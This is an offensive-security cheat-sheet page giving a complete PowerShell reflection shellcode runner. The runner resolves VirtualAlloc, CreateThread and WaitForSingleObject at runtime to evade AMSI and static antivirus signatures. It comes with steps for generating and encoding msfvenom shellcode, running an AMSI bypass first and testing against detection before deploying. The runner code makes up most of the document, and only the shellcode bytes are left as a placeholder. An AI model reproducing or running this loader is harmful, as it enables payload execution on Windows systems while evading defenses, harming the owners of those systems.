# 07.05 Custom PowerShell Reflection Shellcode Runner

> PowerShell shellcode runner using System.Reflection.Emit to bypass static signatures on VirtualAlloc/CreateThread.

## Overview

Reflection-based PowerShell runner resolves Win32 APIs at runtime via System.Reflection.Emit and a LookupFunc helper rather than statically declaring them with Add-Type. Defeats AMSI signatures on classic Add-Type+kernel32+VirtualAlloc patterns. Pair with AMSI bypass and IEX-cradle obfuscation. Encoded shellcode (Caesar/XOR/AES) defeats string-match on raw bytes.

## Steps

- **Step 1** - Generate shellcode (msfvenom raw or Donut).
- **Step 2** - Encode bytes (Caesar/XOR/AES).
- **Step 3** - Drop into runner template — replace shellcode array.
- **Step 4** - Run AMSI bypass first, then load runner.
- **Step 5** - Test with ThreatCheck before deploying.

## Commands

### Full reflection runner

```powershell
function LookupFunc {
    param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq 'GetProcAddress') { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Caesar-encoded shellcode
$shift = 7
$encoded = @(_REPLACE_WITH_ENCODED_BYTES_)
$shellcode = [byte[]] ($encoded | ForEach-Object { ($_ + $shift) -band 0xFF })

# Resolve VirtualAlloc + CreateThread + WaitForSingleObject
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [UInt32]) ([UInt32])))

$addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
$thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($thread, 0xFFFFFFFF) | Out-Null
```
